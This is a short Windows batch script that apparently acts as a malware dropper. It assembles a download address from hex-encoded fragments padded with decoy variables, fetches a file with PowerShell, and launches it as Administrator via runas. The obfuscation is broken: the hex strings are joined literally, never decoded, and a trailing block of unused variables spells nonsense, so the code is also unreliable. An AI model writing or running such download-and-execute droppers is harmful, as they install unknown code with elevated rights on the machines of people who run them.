@echo off

setlocal enabledelayedexpansion
set str1=0x66
set str2=0x70
set str3=0x72
set str4=0x74
set str5=0x6F
set str6=0x73
set str7=0x77
set str8=0x65

set url=!str1!!str2!!str3!!str4!!str5!!str6!!str7!!str8!
set tempFile=test1.exe

set var1=12345
set var2=67890
set var3=abcde

powershell -Command "Invoke-WebRequest !url! -OutFile !tempFile!"
start /B "" runas /user:Administrator "!tempFile!"

set end1=0x61
set end2=0x72
set end3=0x65
set end4=0x6e
set end5=0x64
set end6=0x61
set end7=0x6d
set end8=0x69
set end9=0x6e
set end10=0x66

endlocal
